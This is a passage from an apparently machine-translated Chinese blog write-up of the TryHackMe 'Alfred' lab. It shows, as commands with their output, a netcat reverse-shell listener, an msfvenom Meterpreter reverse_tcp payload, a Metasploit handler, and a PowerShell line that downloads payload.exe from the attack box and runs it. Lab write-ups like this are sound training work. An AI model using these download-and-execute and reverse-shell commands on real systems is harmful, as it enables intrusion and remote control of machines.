mv mw b">Invoke-PowerShellTcp.ps1</code>脚本，然后使用其功能创建我的攻击箱的反向外壳。</p><p id="4ebd" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在让Jenkins执行这个命令之前，我必须在我的AttackBox上启动一个Python HTTP服务器，它将服务于<code class="fe mt mu mv mw b">Invoke-PowerShellTcp.ps1</code>脚本。我使用下面的命令做到了这一点，该命令位于带有<code class="fe mt mu mv mw b">Invoke-PowerShellTcp.ps1</code> PowerShell脚本的工作目录中:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="51dc" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">$ python3 -m http.server 8888<br/></strong>Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</span></pre><p id="cebb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我还在我的AttackBox上设置了一个反向<em class="kp"> netcat </em>监听器，使用以下命令监听PowerShell反向Shell:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="46a7" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">$ nc -l -v -n -p 4444<br/></strong>listening on [any] 4444 ...</span></pre><p id="00e5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">当利用Jenkins面板时，可以用PowerShell命令代替Metasploit的<code class="fe mt mu mv mw b">web_delivery</code>模块给出的命令。这样做之后，应该会收到类似如下的内容:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="78ba" class="nc li iu mw b gz ns nt l nu nv">listening on [any] 4444 …<br/>connect to [attackbox ip] from (UNKNOWN) [boot2root ip] 49256<br/>Windows PowerShell running as user bruce on ALFRED<br/>Copyright © 2015 Microsoft Corporation. All rights reserved.</span><span id="6c09" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">PS C:\Program Files (x86)\Jenkins\workspace\project&gt;</strong></span></pre><p id="adc5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">回到攻击框，教室建议学生生成一个可执行的有效负载来调用一个Meterpreter反向TCP shell:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="c96d" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder        x86/shikata_ga_nai LHOST=&lt;attackbox ip&gt; LPORT=4445 -f exe -o payload.exe<br/></strong>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br/>Found 1 compatible encoders<br/>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br/>x86/shikata_ga_nai succeeded with size 368 (iteration=0)<br/>x86/shikata_ga_nai chosen with final size 368<br/>Payload size: 368 bytes<br/>Final size of exe file: 73802 bytes<br/>Saved as: payload.exe</span></pre><p id="972a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，指导学生通过<code class="fe mt mu mv mw b">exploit/multi/handler</code>启动Meterpreter反向TCP处理程序</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="8a95" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">$ sudo msfconsole</strong></span><span id="612b" class="nc li iu mw b gz oj nt l nu nv">[... snip ...]</span><span id="2f6b" class="nc li iu mw b gz oj nt l nu nv">=[ metasploit v5.0.60-dev ]<br/>+ — — =[ 1947 exploits — 1089 auxiliary — 333 post ]<br/>+ — — =[ 556 payloads — 45 encoders — 10 nops ]<br/>+ — — =[ 7 evasion ]</span><span id="1cfc" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">msf5 &gt; use exploit/multi/handler<br/>msf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</strong><br/>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br/><strong class="mw iv">msf5 exploit(multi/handler) &gt; set LHOST &lt;attackbox ip&gt;</strong><br/>LHOST =&gt; &lt;attackbox ip&gt;<br/><strong class="mw iv">msf5 exploit(multi/handler) &gt; set LPORT 4445</strong><br/>LPORT =&gt; 4445<br/><strong class="mw iv">msf5 exploit(multi/handler) &gt; exploit</strong></span><span id="e093" class="nc li iu mw b gz oj nt l nu nv">[*] Started reverse TCP handler on 10.9.6.135:4445</span></pre><p id="8d3b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在boot2root shell上，我下载并执行了<code class="fe mt mu mv mw b">payload.exe</code>文件:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="cb5c" class="nc li iu mw b gz ns nt l nu nv"><strong class="mw iv">PS C:\&gt; cd C:\\Users\\bruce\\Desktop\\</strong><br/><strong class="mw iv">PS C:\Users\bruce\Desktop&gt; powershell "(New-Object System.Net.WebClient).Downloadfile('http://&lt;attackbox ip&gt;:8888/payload.exe','payload.exe')"</strong><br/><strong class="mw iv">PS C:\Users\bruce\Desktop&gt; ls</strong></span><span id="9dfa" class="nc li iu mw b gz oj nt l nu nv">Directory: C:\Users\bruce\Desktop</span><span id="31ba" class="nc li iu mw b gz oj nt l nu nv">Mode                LastWriteTime     Length Name                              <br/>----                -------------     ------ ----                              <br/>-a---                  [redacted]      73802 payload.exe                       <br/>-a---        10/25/2019  11:22 PM         32 user.txt</span><span id="2c8b" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">PS C:\Users\bruce\Desktop&gt; Start-Process "payload.exe"</strong><br/><strong class="mw iv">PS C:\Users\bruce\Desktop&gt;</strong></span></pre><p id="9d0e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">并启动反向抄表器外壳:</p><pre class="ks kt ku kv gu no mw np nq aw nr bi"><span id="cf4e" class="nc li iu mw b gz ns nt l nu nv">[*] Started reverse TCP handler on &lt;attackbox ip&gt;:4445 <br/>[*] Sending stage (180291 bytes) to &lt;boot2root ip&gt;<br/>[*] Meterpreter session 1 opened (&lt;attackbox ip&gt;:4445 -&gt; &lt;boot2root ip&gt;:49287) at [redacted] -0400</span><span id="340e" class="nc li iu mw b gz oj nt l nu nv"><strong class="mw iv">meterpreter &gt;</strong></span></pre><p id="6157" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="162c" class="lh li iu bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">参考</h1><p id="7d61" class="pw-post-body-paragraph jr js iu jt b ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk mj km kn ko in bi translated">戴维斯，H. (2021)。<em class="kp">如何在Jenkins中运行shell命令？</em>快速顾问。2022年3月20日检索自:<a class="ae kq" href="https://quick-adviser.com/how-do-i-run-a-shell-command-in-jenkins/" rel="noopener ugc nofollow" target="_blank">https://quick-adviser . com/how-do-I-run-a-shell-command-in-Jenkins/</a></p><p id="16b7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">多布金斯，议员(1999年)。<em class="kp">我！我！我！(第一季第三集)</em>【电视剧集】。古怪的神秘事件。链接:<a class="ae kq" href="https://www.youtube.com/watch?v=faGib7zY1rA" rel="noopener ugc nofollow" target="_blank">https://www.youtube.com/watch?v=faGib7zY1rA</a></p><p id="7699" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">t .汉密尔顿(2020年)。<em class="kp">如何在Jenkins Freestyle项目中创建新的构建作业</em>。Guru99。2022年3月20日检索自:<a class="ae kq" href="https://www.guru99.com/create-builds-jenkins-freestyle-project.html" rel="noopener ugc nofollow" target="_blank">https://www . guru 99 . com/create-builds-Jenkins-free style-project . html</a></p><p id="7032" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">詹金斯(挪威)。2022年3月22日检索自:<a class="ae kq" href="https://www.jenkins.io/" rel="noopener ugc nofollow" target="_blank">https://www.jenkins.io/</a></p><p id="3ded" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">肯尼迪等人(2021年)。<em class="kp">访问令牌</em>。微软文档。2022年3月22日检索自:<a class="ae kq" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/windows/win32/secauthz/access-tokens</a></p><p id="0679" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Mittal，n .和Mehlmauer，c .(未注明)。<em class="kp">调用-PowerShellTcp.ps1 </em>。GitHub仓库。2022年3月20日检索自:<a class="ae kq" href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" rel="noopener ugc nofollow" target="_blank">https://github . com/samratashok/nishang/blob/master/shell/Invoke-powershelltcp . PS1</a></p><p id="055e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《tryhackme》(2019)。阿尔弗雷德。2022年3月22日检索自:<a class="ae kq" href="https://tryhackme.com/room/alfred" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/alfred</a></p></div></div>    
</body>
</html>